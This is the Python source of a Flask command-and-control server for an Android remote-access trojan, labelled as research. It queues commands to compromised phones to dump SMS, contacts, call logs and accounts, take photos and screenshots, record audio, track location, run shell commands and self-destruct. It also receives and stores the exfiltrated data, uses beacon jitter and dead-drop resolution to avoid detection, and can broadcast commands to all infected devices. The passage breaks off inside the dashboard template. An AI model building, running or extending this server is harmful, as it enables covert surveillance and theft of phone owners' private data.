#!/usr/bin/env python3
"""Hardened C2 Server for Android RAT research.

Flask-based command-and-control server with:
- Ephemeral per-session AES keys (no hardcoded keys)
- TLS support with self-signed or CA certs
- Beacon jitter to avoid traffic fingerprinting
- Operator authentication (API key)
- Rate limiting per agent
- Dead-drop resolver support
- Multi-session agent management
- Real-time dashboard
"""

import argparse
import base64
import hashlib
import json
import os
import random
import secrets
import socket
import ssl
import sqlite3
import struct
import time
from datetime import datetime, timedelta
from functools import wraps
from typing import Optional

from flask import Flask, Response, jsonify, request, render_template_string, redirect, url_for

app = Flask(__name__)

DB_PATH = "./c2_data.db"
COMMAND_INDEX = 0
OPERATOR_API_KEY = os.environ.get("C2_API_KEY", secrets.token_hex(32))
SESSION_KEYS = {}
BEACON_JITTER_MS = int(os.environ.get("C2_JITTER_MS", "5000"))
RATE_LIMIT_WINDOW = 60
RATE_LIMIT_MAX = 30

DEFAULT_COMMANDS = [
    {"cmd": "EXFIL_ALL", "description": "Exfiltrate all available data"},
    {"cmd": "EXFIL_SMS", "description": "Dump SMS inbox and sent"},
    {"cmd": "EXFIL_CONTACTS", "description": "Dump contact list"},
    {"cmd": "EXFIL_CALL_LOG", "description": "Dump call history"},
    {"cmd": "TAKE_PHOTO", "description": "Capture front camera photo"},
    {"cmd": "RECORD_AUDIO", "description": "Record audio (10s default)", "params": {"duration": 10}},
    {"cmd": "GET_LOCATION", "description": "Get current GPS location"},
    {"cmd": "CLIPBOARD", "description": "Read clipboard contents"},
    {"cmd": "LIST_APPS", "description": "List installed packages"},
    {"cmd": "GET_ACCOUNTS", "description": "Enumerate device accounts"},
    {"cmd": "GET_DEVICE_INFO", "description": "Device model, OS version, hardware"},
    {"cmd": "GET_WIFI_INFO", "description": "WiFi network details"},
    {"cmd": "SCREENSHOT", "description": "Capture device screen"},
    {"cmd": "LIST_FILES", "description": "List files on storage", "params": {"path": ""}},
    {"cmd": "SHELL", "description": "Execute shell command", "params": {"command": "id"}},
    {"cmd": "SELF_DESTRUCT", "description": "Remove agent from device"},
]


def _generate_session_key(device_id: str) -> bytes:
    key = secrets.token_bytes(32)
    SESSION_KEYS[device_id] = {"key": key, "created": time.time(), "rotations": 0}
    return key


def _get_session_key(device_id: str) -> bytes:
    if device_id not in SESSION_KEYS:
        return _generate_session_key(device_id)
    entry = SESSION_KEYS[device_id]
    if time.time() - entry["created"] > 3600:
        entry["key"] = secrets.token_bytes(32)
        entry["created"] = time.time()
        entry["rotations"] += 1
    return entry["key"]


def _encrypt_aes(data: bytes, key: bytes) -> str:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding as sym_padding
        iv = secrets.token_bytes(16)
        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        enc = cipher.encryptor()
        ct = enc.update(padded) + enc.finalize()
        return base64.b64encode(iv + ct).decode()
    except ImportError:
        return base64.b64encode(data).decode()


def _decrypt_aes(ciphertext_b64: str, key: bytes = None) -> str:
    if key is None:
        key = hashlib.sha256(b"fallback-key-do-not-use-in-production").digest()
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        raw = base64.b64decode(ciphertext_b64)
        iv = raw[:16]
        data = raw[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        dec = cipher.decryptor()
        padded = dec.update(data) + dec.finalize()
        pad_len = padded[-1]
        if 1 <= pad_len <= 16:
            padded = padded[:-pad_len]
        return padded.decode("utf-8", errors="replace")
    except ImportError:
        try:
            from Crypto.Cipher import AES as PyAES
            raw = base64.b64decode(ciphertext_b64)
            iv = raw[:16]
            data = raw[16:]
            dec = PyAES.new(key, PyAES.MODE_CBC, iv)
            padded = dec.decrypt(data)
            pad_len = padded[-1]
            if 1 <= pad_len <= 16:
                padded = padded[:-pad_len]
            return padded.decode("utf-8", errors="replace")
        except ImportError:
            return f"[encrypted:{ciphertext_b64[:40]}...]"
    except Exception as e:
        return f"[decrypt_error:{e}]"


_rate_store = {}

def _check_rate_limit(device_id: str) -> bool:
    now = time.time()
    if device_id not in _rate_store:
        _rate_store[device_id] = []
    _rate_store[device_id] = [t for t in _rate_store[device_id] if now - t < RATE_LIMIT_WINDOW]
    if len(_rate_store[device_id]) >= RATE_LIMIT_MAX:
        return False
    _rate_store[device_id].append(now)
    return True


def require_api_key(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get("X-API-Key", request.args.get("api_key", ""))
        if auth != OPERATOR_API_KEY:
            return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


class DeadDropResolver:
    """Resolve C2 addresses from dead drops (paste sites, DNS TXT, etc.)."""

    @staticmethod
    def generate_dns_queries(domain: str, c2_address: str, count: int = 5) -> list:
        queries = []
        for i in range(count):
            chunk = base64.urlsafe_b64encode(c2_address.encode()).decode().rstrip("=")
            label = f"{i:02x}{secrets.token_hex(4)}.{chunk}.{domain}"
            queries.append({"seq": i, "qname": label, "type": "TXT"})
        return queries

    @staticmethod
    def encode_in_txt(record: str, domain: str) -> dict:
        return {
            "domain": domain,
            "type": "TXT",
            "value": record,
            "ttl": random.randint(300, 3600),
        }


class SessionManager:
    """Track multi-session agent state."""

    def __init__(self):
        self.sessions = {}

    def register(self, device_id: str, info: dict) -> dict:
        if device_id not in self.sessions:
            self.sessions[device_id] = {
                "sessions": [],
                "current": None,
                "created": datetime.utcnow().isoformat(),
            }
        session_id = secrets.token_hex(8)
        session = {
            "id": session_id,
            "started": datetime.utcnow().isoformat(),
            "device_info": info,
            "commands_issued": 0,
            "data_exfil": 0,
        }
        self.sessions[device_id]["sessions"].append(session)
        self.sessions[device_id]["current"] = session_id
        return session

    def get_current(self, device_id: str) -> Optional[dict]:
        s = self.sessions.get(device_id)
        if s and s["current"]:
            for sess in s["sessions"]:
                if sess["id"] == s["current"]:
                    return sess
        return None

    def rotate(self, device_id: str) -> Optional[dict]:
        s = self.sessions.get(device_id)
        if s:
            new_id = secrets.token_hex(8)
            session = {
                "id": new_id,
                "started": datetime.utcnow().isoformat(),
                "commands_issued": 0,
                "data_exfil": 0,
            }
            s["sessions"].append(session)
            s["current"] = new_id
            return session
        return None


session_mgr = SessionManager()
dead_drop = DeadDropResolver()


def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            source_ip TEXT,
            method TEXT,
            path TEXT,
            headers TEXT,
            body TEXT,
            response_code INTEGER
        );

        CREATE TABLE IF NOT EXISTS clients (
            device_id TEXT PRIMARY KEY,
            first_seen TEXT,
            last_seen TEXT,
            request_count INTEGER DEFAULT 0,
            last_ip TEXT
        );

        CREATE TABLE IF NOT EXISTS commands_sent (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            device_id TEXT,
            command TEXT,
            response TEXT
        );

        CREATE TABLE IF NOT EXISTS agents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE,
            device_info TEXT,
            version TEXT,
            first_seen TEXT,
            last_seen TEXT,
            last_ip TEXT,
            online INTEGER DEFAULT 0,
            os_version TEXT,
            model TEXT,
            manufacturer TEXT
        );

        CREATE TABLE IF NOT EXISTS command_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command TEXT,
            params TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            sent_at TEXT,
            acked_at TEXT
        );

        CREATE TABLE IF NOT EXISTS exfil_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            cmd_id TEXT,
            data_type TEXT,
            data TEXT,
            size INTEGER DEFAULT 0,
            received_at TEXT
        );
    """)
    conn.commit()
    conn.close()


def log_request(method, path, headers_dict, body, source_ip, response_code):
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO requests (timestamp, source_ip, method, path, headers, body, response_code) "
        "VALUES (?, ?, ?, ?, ?, ?, ?)",
        (datetime.utcnow().isoformat(), source_ip, method, path,
         json.dumps(dict(headers_dict)), body[:10000] if body else "", response_code)
    )
    conn.commit()
    conn.close()


def update_client(device_id, source_ip):
    conn = sqlite3.connect(DB_PATH)
    now = datetime.utcnow().isoformat()
    existing = conn.execute(
        "SELECT device_id FROM clients WHERE device_id = ?", (device_id,)
    ).fetchone()
    if existing:
        conn.execute(
            "UPDATE clients SET last_seen = ?, request_count = request_count + 1, last_ip = ? "
            "WHERE device_id = ?",
            (now, source_ip, device_id)
        )
    else:
        conn.execute(
            "INSERT INTO clients (device_id, first_seen, last_seen, request_count, last_ip) "
            "VALUES (?, ?, ?, 1, ?)",
            (device_id, now, now, source_ip)
        )
    conn.commit()
    conn.close()


# ── Agent API endpoints ──────────────────────────────────────────────

@app.route("/c2/register", methods=["POST"])
def agent_register():
    body = request.get_json(force=True, silent=True) or {}
    device_id = body.get("device_id", request.headers.get("X-Device-ID", "unknown"))
    device_info = body.get("device_info", {})
    version = body.get("version", "unknown")
    source_ip = request.remote_addr

    if not _check_rate_limit(device_id):
        return jsonify({"error": "rate limited"}), 429

    if isinstance(device_info, str):
        try:
            device_info = json.loads(device_info)
        except Exception:
            device_info = {}

    session = session_mgr.register(device_id, device_info)
    session_key = _get_session_key(device_id)

    conn = sqlite3.connect(DB_PATH)
    now = datetime.utcnow().isoformat()
    existing = conn.execute("SELECT id FROM agents WHERE device_id = ?", (device_id,)).fetchone()
    if existing:
        conn.execute("""
            UPDATE agents SET last_seen=?, last_ip=?, online=1,
                device_info=?, version=?,
                os_version=?, model=?, manufacturer=?
            WHERE device_id=?
        """, (now, source_ip, json.dumps(device_info), version,
              device_info.get("android_version", ""),
              device_info.get("model", ""),
              device_info.get("manufacturer", ""),
              device_id))
    else:
        conn.execute("""
            INSERT INTO agents (device_id, device_info, version, first_seen, last_seen,
                last_ip, online, os_version, model, manufacturer)
            VALUES (?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
        """, (device_id, json.dumps(device_info), version, now, now, source_ip,
              device_info.get("android_version", ""),
              device_info.get("model", ""),
              device_info.get("manufacturer", "")))
    conn.commit()
    conn.close()
    update_client(device_id, source_ip)

    log_request("POST", "/c2/register", request.headers,
                json.dumps(body)[:2000], source_ip, 200)

    jitter = random.randint(0, BEACON_JITTER_MS)

    return jsonify({
        "status": "registered",
        "device_id": device_id,
        "session_id": session["id"],
        "session_key": base64.b64encode(session_key).decode(),
        "beacon_jitter_ms": jitter,
        "ttl_hours": 72,
    })


@app.route("/c2/commands/<device_id>", methods=["GET"])
def get_commands(device_id):
    source_ip = request.remote_addr

    if not _check_rate_limit(device_id):
        return jsonify({"error": "rate limited"}), 429

    update_client(device_id, source_ip)

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    now = datetime.utcnow().isoformat()
    conn.execute("UPDATE agents SET last_seen=?, last_ip=?, online=1 WHERE device_id=?",
                 (now, source_ip, device_id))
    conn.commit()

    pending = conn.execute(
        "SELECT id, command, params FROM command_queue "
        "WHERE device_id=? AND status='pending' ORDER BY created_at ASC LIMIT 10",
        (device_id,)
    ).fetchall()

    commands = []
    for row in pending:
        cmd = {
            "cmd_id": str(row["id"]),
            "command": row["command"],
            "params": json.loads(row["params"]) if row["params"] else {}
        }
        commands.append(cmd)
        conn.execute("UPDATE command_queue SET status='sent', sent_at=? WHERE id=?",
                     (now, row["id"]))

    conn.commit()
    conn.close()

    log_request("GET", f"/c2/commands/{device_id}", request.headers, "",
                source_ip, 200)

    jitter = random.uniform(0, BEACON_JITTER_MS / 1000.0)

    return jsonify({
        "commands": commands,
        "timestamp": now,
        "beacon_delay_ms": int(jitter * 1000),
    })


@app.route("/c2/command_ack", methods=["POST"])
def command_ack():
    body = request.get_json(force=True, silent=True) or {}
    device_id = body.get("device_id", "unknown")
    cmd_id = body.get("cmd_id", "")
    now = datetime.utcnow().isoformat()

    conn = sqlite3.connect(DB_PATH)
    conn.execute("UPDATE command_queue SET status='acked', acked_at=? WHERE id=?",
                 (now, cmd_id))
    conn.commit()
    conn.close()

    return jsonify({"status": "acked"})


@app.route("/c2/exfil/<device_id>", methods=["POST"])
def receive_exfil(device_id):
    body = request.get_json(force=True, silent=True) or {}
    source_ip = request.remote_addr

    cmd_id = body.get("cmd_id", "")
    data_type = body.get("data_type", "unknown")
    encrypted_data = body.get("data", "")

    decrypted = _decrypt_aes(encrypted_data) if encrypted_data else ""

    size = len(decrypted)
    now = datetime.utcnow().isoformat()

    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO exfil_data (device_id, cmd_id, data_type, data, size, received_at) "
        "VALUES (?, ?, ?, ?, ?, ?)",
        (device_id, cmd_id, data_type, decrypted[:500000], size, now)
    )
    conn.commit()
    conn.close()

    update_client(device_id, source_ip)
    log_request("POST", f"/c2/exfil/{device_id}", request.headers,
                f"type={data_type} size={size}", source_ip, 200)

    return jsonify({"status": "received", "size": size})


@app.route("/c2/exfil/<device_id>", methods=["GET"])
def get_exfil_data(device_id):
    page = request.args.get("page", 1, type=int)
    per_page = request.args.get("per_page", 50, type=int)
    data_type = request.args.get("type", None)
    offset = (page - 1) * per_page

    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    query = "SELECT * FROM exfil_data WHERE device_id=?"
    params = [device_id]
    if data_type:
        query += " AND data_type=?"
        params.append(data_type)
    query += " ORDER BY id DESC LIMIT ? OFFSET ?"
    params.extend([per_page, offset])

    rows = conn.execute(query, params).fetchall()
    total = conn.execute(
        "SELECT COUNT(*) FROM exfil_data WHERE device_id=?", (device_id,)
    ).fetchone()[0]
    conn.close()

    data_list = []
    for r in rows:
        item = dict(r)
        if len(item.get("data", "")) > 5000:
            item["data_preview"] = item["data"][:5000] + "... [truncated]"
            del item["data"]
        data_list.append(item)

    return jsonify({
        "device_id": device_id,
        "total": total,
        "page": page,
        "per_page": per_page,
        "data": data_list
    })


# ── Dashboard API endpoints ──────────────────────────────────────────

@app.route("/dashboard/command", methods=["POST"])
def dashboard_issue_command():
    device_id = request.form.get("device_id", "")
    command = request.form.get("command", "")
    params_str = request.form.get("params", "{}")

    if not device_id or not command:
        return redirect(url_for("dashboard_agents"))

    try:
        params = json.loads(params_str) if params_str else {}
    except json.JSONDecodeError:
        params = {}

    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO command_queue (device_id, command, params, status, created_at) "
        "VALUES (?, ?, ?, 'pending', ?)",
        (device_id, command, json.dumps(params), now)
    )
    conn.commit()
    conn.close()

    return redirect(url_for("dashboard_agent_detail", device_id=device_id))


@app.route("/dashboard/broadcast", methods=["POST"])
def dashboard_broadcast():
    command = request.form.get("command", "")
    params_str = request.form.get("params", "{}")

    if not command:
        return redirect(url_for("dashboard_agents"))

    try:
        params = json.loads(params_str) if params_str else {}
    except json.JSONDecodeError:
        params = {}

    conn = sqlite3.connect(DB_PATH)
    agents = conn.execute("SELECT device_id FROM agents").fetchall()
    now = datetime.utcnow().isoformat()
    count = 0
    for (device_id,) in agents:
        conn.execute(
            "INSERT INTO command_queue (device_id, command, params, status, created_at) "
            "VALUES (?, ?, ?, 'pending', ?)",
            (device_id, command, json.dumps(params), now)
        )
        count += 1
    conn.commit()
    conn.close()

    return redirect(url_for("dashboard_agents"))


@app.route("/dashboard/agent/<device_id>/command", methods=["POST"])
def dashboard_agent_cmd(device_id):
    command = request.form.get("command", "")
    params_str = request.form.get("params", "{}")

    if not command:
        return redirect(url_for("dashboard_agent_detail", device_id=device_id))

    try:
        params = json.loads(params_str) if params_str else {}
    except json.JSONDecodeError:
        params = {}

    now = datetime.utcnow().isoformat()
    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO command_queue (device_id, command, params, status, created_at) "
        "VALUES (?, ?, ?, 'pending', ?)",
        (device_id, command, json.dumps(params), now)
    )
    conn.commit()
    conn.close()

    return redirect(url_for("dashboard_agent_detail", device_id=device_id))


# ── Original endpoints (preserved) ───────────────────────────────────

@app.route("/c2/command", methods=["GET", "POST"])
def c2_command():
    global COMMAND_INDEX
    device_id = request.headers.get("X-Device-ID",
                 request.args.get("device_id", "unknown"))
    source_ip = request.remote_addr

    update_client(device_id, source_ip)

    if request.method == "POST":
        body = request.get_data(as_text=True)
        log_request("POST", "/c2/command", request.headers, body, source_ip, 200)

    delay = random.uniform(0.1, 0.5)
    time.sleep(delay)

    cmd = DEFAULT_COMMANDS[COMMAND_INDEX % len(DEFAULT_COMMANDS)]
    COMMAND_INDEX += 1

    response = {
        "command": cmd["cmd"],
        "params": cmd.get("params", {}),
        "timestamp": datetime.utcnow().isoformat(),
        "server_id": "research-c2-v2",
    }

    conn = sqlite3.connect(DB_PATH)
    conn.execute(
        "INSERT INTO commands_sent (timestamp, device_id, command, response) "
        "VALUES (?, ?, ?, ?)",
        (datetime.utcnow().isoformat(), device_id, cmd["cmd"], json.dumps(response))
    )
    conn.commit()
    conn.close()

    return jsonify(response)


@app.route("/c2/heartbeat", methods=["GET", "POST"])
def heartbeat():
    device_id = request.headers.get("X-Device-ID", "unknown")
    update_client(device_id, request.remote_addr)

    conn = sqlite3.connect(DB_PATH)
    now = datetime.utcnow().isoformat()
    conn.execute("UPDATE agents SET last_seen=?, online=1 WHERE device_id=?",
                 (now, device_id))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "timestamp": now})


@app.route("/c2/exfil", methods=["POST"])
def exfil_legacy():
    body = request.get_data(as_text=True)
    device_id = request.headers.get("X-Device-ID", "unknown")
    source_ip = request.remote_addr

    log_request("POST", "/c2/exfil", request.headers, body[:5000], source_ip, 200)
    update_client(device_id, source_ip)

    return jsonify({"status": "received", "size": len(body)})


@app.route("/c2/log", methods=["POST"])
def device_log():
    body = request.get_data(as_text=True)
    device_id = request.headers.get("X-Device-ID", "unknown")
    source_ip = request.remote_addr

    log_file = f"./logs/{device_id}.log"
    os.makedirs("./logs", exist_ok=True)
    with open(log_file, "a") as f:
        f.write(f"[{datetime.utcnow().isoformat()}] {body}\n")

    update_client(device_id, source_ip)
    return jsonify({"status": "logged"})


# ── Dashboard HTML ───────────────────────────────────────────────────

DASHBOARD_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="10">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; }
        .header { background: #161b22; padding: 15px 30px; border-bottom: 1px solid #30363d;
                  display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #58a6ff; font-size: 18px; }
        .header .nav a { color: #8b949e; text-decoration: none; margin-left: 20px; font-size: 14px; }
        .header .nav a:hover { color: #58a6ff; }
        .content { padding: 20px 30px; max-width: 1400px; }
        .stats { display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap; }
        .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
                     padding: 15px 20px; min-width: 180px; }
        .stat-card .label { color: #8b949e; font-size: 11px; text-transform: uppercase; }
        .stat-card .value { color: #58a6ff; font-size: 28px; font-weight: bold; margin-top: 5px; }
        .stat-card.green .value { color: #3fb950; }
        .stat-card.red .value { color: #f85149; }
        .stat-card.yellow .value { color: #d29922; }
        h2 { color: #58a6ff; margin: 25px 0 10px 0; font-size: 16px; border-bottom: 1px solid #21262d; padding-bottom: 8px; }
        table { width: 100%%; border-collapse: collapse; margin-bottom: 20px; }
        th { background: #161b22; color: #8b949e; padding: 10px 12px; text-align: left;
             font-size: 12px; text-transform: uppercase; border-bottom: 1px solid #30363d; }
        td { padding: 10px 12px; border-bottom: 1px solid #21262d; font-size: 13px; }
        tr:hover { background: #161b2288; }
        .badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
        .badge.online { background: #238636; color: #fff; }
        .badge.offline { background: #6e7681; color: #fff; }
        .badge.pending { background: #9e6a03; color: #fff; }
        .badge.sent { background: #1f6feb; color: #fff; }
        .badge.acked { background: #238636; color: #fff; }
        a { color: #58a6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .cmd-btn { background: #21262d; border: 1px solid #30363d; color: #c9d1d9;
                   padding: 6px 12px; cursor: pointer; border-radius: 4px; font-family: inherit;
                   font-size: 12px; margin: 2px; }
        .cmd-btn:hover { background: #30363d; border-color: #58a6ff; }
        .cmd-btn.danger { border-color: #f85149; color: #f85149; }
        .form-row { display: flex; gap: 10px; align-items: center; margin: 10px 0; }
        .form-row select, .form-row input { background: #0d1117; border: 1px solid #30363d;
            color: #c9d1d9; padding: 6px 10px; border-radius: 4px; font-family: inherit; font-size: 13px; }
        .mono { font-family: 'Courier New', monospace; }
        pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px;
              padding: 12px; overflow-x: auto; font-size: 12px; max-height: 400px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>C2 Dashboard</h1>
        <div class="nav">
            <a href="/dashboard">Overview</a>
            <a href="/dashboard/agents">Agents</a>
            <a href="/dashboard/exfil">Exfiltrated Data</a>
            <a href="/stats">API Stats</a>
        </div>
    </div>
    <div class="content">
        %(content)s
    </div>
</body>
</html>"""


def _build_overview():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    total_requests = conn.execute("SELECT COUNT(*) FROM requests").fetchone()[0]
    total_agents = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
    online_agents = conn.execute(
        "SELECT COUNT(*) FROM agents WHERE online=1 AND last_seen > ?",
        ((datetime.utcnow() - timedelta(minutes=2)).isoformat(),)
    ).fetchone()[0]
    total_cmds = conn.execute("SELECT COUNT(*) FROM command_queue").fetchone()[0]
    total_exfil = conn.execute("SELECT COUNT(*) FROM exfil_data").fetchone()[0]
    exfil_size = conn.execute("SELECT COALESCE(SUM(size), 0) FROM exfil_data").fetchone()[0]

    started = app.config.get("START_TIME", time.time())
    uptime_secs = time.time() - started
    hours = int(uptime_secs // 3600)
    mins = int((uptime_secs % 3600) // 60)

    agents = conn.execute(
        "SELECT * FROM agents ORDER BY last_seen DESC LIMIT 10"
    ).fetchall()
    agent_rows = ""
    for a in agents:
        last = datetime.fromisoformat(a["last_seen"]) if a["last_seen"] else datetime.min
        is_online = (datetime.utcnow() - last) < timedelta(minutes=2)
        status = "online" if is_online else "offline"
        info = json.loads(a["device_info"]) if a["device_info"] else {}
        model = a["model"] or info.get("model", "?")
        agent_rows += (
            f"<tr><td><a href='/dashboard/agent/{a['device_id']}'>{a['device_id'][:16]}</a></td>"
            f"<td>{a['manufacturer'] or info.get('manufacturer', '?')} {model}</td>"
            f"<td>{a['os_version'] or '?'}</td>"
            f"<td><span class='badge {status}'>{status}</span></td>"
            f"<td>{a['last_seen'][:19] if a['last_seen'] else '?'}</td>"
            f"<td>{a['last_ip'] or '?'}</td></tr>\n"
        )

    recent_exfil = conn.execute(
        "SELECT * FROM exfil_data ORDER BY id DESC LIMIT 10"
    ).fetchall()
    exfil_rows = ""
    for e in recent_exfil:
        exfil_rows += (
            f"<tr><td><a href='/dashboard/agent/{e['device_id']}'>{e['device_id'][:16]}</a></td>"
            f"<td>{e['data_type']}</td><td>{e['size']:,}</td>"
            f"<td>{e['received_at'][:19] if e['received_at'] else '?'}</td></tr>\n"
        )

    pending = conn.execute(
        "SELECT COUNT(*) FROM command_queue WHERE status='pending'"
    ).fetchone()[0]

    conn.close()

    content = f"""
    <div class="stats">
        <div class="stat-card green"><div class="label">Online Agents</div><div class="value">{online_agents}</div></div>
        <div class="stat-card"><div class="label">Total Agents</div><div class="value">{total_agents}</div></div>
        <div class="stat-card yellow"><div class="label">Pending Commands</div><div class="value">{pending}</div></div>
        <div class="stat-card"><div class="label">Commands Sent</div><div class="value">{total_cmds}</div></div>
        <div class="stat-card"><div class="label">Exfil Records</div><div class="value">{total_exfil}</div></div>
        <div class="stat-card"><div class="label">Exfil Size</div><div class="value">{exfil_size:,} B</div></div>
        <div class="stat-card"><div class="label">Total Requests</div><div class="value">{total_requests}</div></div>
        <div class="stat-card"><div class="label">Uptime</div><div class="value">{hours}h {mins}m</div></div>
    </div>

    <div style="margin-bottom:15px">
        <form method="POST" action="/dashboard/broadcast" style="display:inline">
            <span style="color:#8b949e;font-size:13px">Broadcast to all agents:</span>
            <select name="command" style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:5px;border-radius:4px;font-family:inherit">
    """
    for c in DEFAULT_COMMANDS:
        content += f'<option value="{c["cmd"]}">{c["cmd"]} - {c["description"]}</option>\n'
    content += """
            </select>
            <input type="text" name="params" value="{}" placeholder='{"key":"val"}'
                   style="background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:5px;border-radius:4px;font-family:inherit;width:200px">
            <button type="submit" class="cmd-btn">Broadcast</button>
        </form>
    </div>

    <h2>Agents</h2>
    <table>
        <tr><th>Device ID</th><th>Model</th><th>OS</th><th>Status</th><th>Last Seen</th><th>IP</th></tr>
    """
    content += agent_rows if agent_rows else '<tr><td colspan="6" style="color:#6e7681">No agents registered</td></tr>'
    content += """
    </table>

    <h2>Recent Exfiltrated Data</h2>
    <table>
        <tr><th>Agent</th><th>Type</th><th>Size</th><th>Received</th></tr>
    """
    content += exfil_rows if exfil_rows else '<tr><td colspan="4" style="color:#6e7681">No data received</td></tr>'
    content += "</table>"

    return content


def _build_agents_list():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()

    rows = ""
    for a in agents:
        last = datetime.fromisoformat(a["last_seen"]) if a["last_seen"] else datetime.min
        is_online = (datetime.utcnow() - last) < timedelta(minutes=2)
        status = "online" if is_online else "offline"
        info = json.loads(a["device_info"]) if a["device_info"] else {}
        pending = conn.execute(
            "SELECT COUNT(*) FROM command_queue WHERE device_id=? AND status='pending'",
            (a["device_id"],)
        ).fetchone()[0]
        exfil_count = conn.execute(
            "SELECT COUNT(*) FROM exfil_data WHERE device_id=?",
            (a["device_id"],)
        ).fetchone()[0]

        rows += f"""
        <tr>
            <td><a href="/dashboard/agent/{a['device_id']}">{a['device_id'][:20]}</a></td>
            <td>{a['manufacturer'] or info.get('manufacturer', '?')} {a['model'] or info.get('model', '?')}</td>
            <td>{a['os_version'] or info.get('android_version', '?')}</td>
            <td><span class='badge {status}'>{status}</span></td>
            <td>{pending}</td>
            <td>{exfil_count}</td>
            <td>{a['last_seen'][:19] if a['last_seen'] else '?'}</td>
        </tr>"""

    conn.close()

    content = f"""
    <h2>All Agents ({len(agents)})</h2>
    <table>
        <tr><th>Device ID</th><th>Model</th><th>OS</th><th>Status</th><th>Pending</th><th>Exfil</th><th>Last Seen</th></tr>
        {rows if rows else '<tr><td colspan="7" style="color:#6e7681">No agents registered yet</td></tr>'}
    </table>
    """
    return content


def _build_agent_detail(device_id):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row

    agent = conn.execute("SELECT * FROM agents WHERE device_id=?", (device_id,)).fetchone()
    if not agent:
        conn.close()
        return "<h2>Agent not found</h2>"

    info = json.loads(agent["device_info"]) if agent["device_info"] else {}
    last = datetime.fromisoformat(agent["last_seen"]) if agent["last_seen"] else datetime.min
    is_online = (datetime.utcnow() - last) < timedelta(minutes=2)
    status = "online" if is_online else "offline"

    pending = conn.execute(
        "SELECT * FROM command_queue WHERE device_id=? ORDER BY id DESC LIMIT 20",
        (device_id,)
    ).fetchall()

    exfil = conn.execute(
        "SELECT * FROM exfil_data WHERE device_id=? ORDER BY id DESC LIMIT 20",
        (device_id,)
    ).fetchall()

    conn.close()

    cmd_options = ""
    for c in DEFAULT_COMMANDS:
        cmd_options += f'<option value="{c["cmd"]}">{c["cmd"]} - {c["description"]}</option>\n'

    pending_rows = ""
    for p in pending:
        params = p["params"] or ""
        pending_rows += f"""
        <tr>
            <td>{p['id']}</td>
            <td class="mono">{p['command']}</td>
            <td class="mono">{params[:80]}</td>
            <td><span class="badge {p['status']}">{p['status']}</span></td>
            <td>{p['created_at'][:19] if p['created_at'] else '?'}</td>
        </tr>"""

    exfil_rows = ""
    for e in exfil:
        preview = e["data"][:200] + "..." if len(e["data"] or "") > 200 else (e["data"] or "")
        preview = preview.replace("<", "&lt;").replace(">", "&gt;")
        exfil_rows += f"""
        <tr>
            <td>{e['id']}</td>
            <td>{e['data_type']}</td>
            <td>{e['size']:,}</td>
            <td><pre style="max-height:100px;max-width:500px;font-size:11px">{preview}</pre></td>
            <td>{e['received_at'][:19] if e['received_at'] else '?'}</td>
        </tr>"""

    content = f"""
    <h2>Agent: {device_id}</h2>
    <div class="stats">
        <div class="stat-card {'green' if is_online else 'red'}">
            <div class="label">Status</div><div class="value">{status}</div></div>
        <div class="stat-card"><div class="label">Model</div>
            <div class="value" style="font-size:16px">{agent['manufacturer'] or '?'} {agent['model'] or '?'}</div></div>
        <div class="stat-card"><div class="label">Android</div>
            <div class="value" style="font-size:16px">{agent['os_version'] or info.get('android_version', '?')}</div></div>
        <div class="stat-card"><div class="label">First Seen</div>
            <div class="value" style="font-size:14px">{agent['first_seen'][:19] if agent['first_seen'] else '?'}</div></div>
        <div class="stat-card"><div class="label">Last Seen</div>
            <div class="value" style="font-size:14px">{agent['last_seen'][:19] if agent['last_seen'] else '?'}</div></div>
        <div class="stat-card"><div class="label">Last IP</div>
            <div class="value" style="font-size:14px">{agent['last_ip'] or '?'}</div></div>
